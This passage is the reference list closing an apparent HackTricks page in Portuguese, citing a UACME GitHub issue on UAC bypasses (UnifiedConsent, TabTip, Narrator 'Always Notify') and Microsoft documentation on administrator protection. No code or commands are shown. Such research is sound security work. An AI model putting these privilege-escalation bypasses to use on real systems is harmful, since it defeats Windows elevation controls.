- [9] [R41N3RZUF477 – Bypasses de UnifiedConsent, TabTip e Narrator Always Notify](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Proteção de administradores](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
